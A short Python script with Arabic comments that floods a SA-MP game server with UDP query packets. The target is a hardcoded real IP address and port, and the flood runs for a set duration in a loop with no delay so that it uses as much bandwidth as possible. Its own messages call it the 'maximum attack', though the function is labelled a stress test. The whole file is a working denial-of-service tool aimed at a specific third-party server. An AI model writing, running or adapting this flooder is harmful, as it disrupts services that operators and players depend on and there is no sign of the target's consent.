import socket
import struct
import time

# إعدادات الهدف
TARGET_IP = "51.68.107.75"  # IP الهدف
TARGET_PORT = 16498        # منفذ السيرفر
DURATION = 60              # مدة الضغط بالثواني (تقدر تزيدها كي تحب)

def extreme_stress_test():
    # فتح سوكيت UDP سريع
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # تجهيز حزمة SAMP الصحيحة والثقيلة لتوليد ضغط حقيقي
    try:
        ip_bytes = socket.inet_aton(TARGET_IP)
        port_bytes = struct.pack('<H', int(TARGET_PORT))
        payload = b'SAMP' + ip_bytes + port_bytes + b'i'
    except Exception as e:
        print(f"خطأ في تجهيز الحزمة: {e}")
        client.close()
        return

    end_time = time.time() + DURATION
    count = 0
    
    print(f"[🔥] انطلاق الهجوم الأقصى نحو {TARGET_IP}:{TARGET_PORT} بأقصى سرعة بدون توقف...")
    
    try:
        # حلقة مفتوحة بدون أي time.sleep لاستهلاك أقصى باندويث ممكن
        while time.time() < end_time:
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
            count += 1
    except Exception as e:
        print(f"حدث خطأ أثناء الإرسال: {e}")
    finally:
        client.close()
        print(f"[✅] انتهى الاختبار. تم إرسال {count} حزمة بنجاح تام وبأقصى سرعة!")

if __name__ == "__main__":
    extreme_stress_test()
    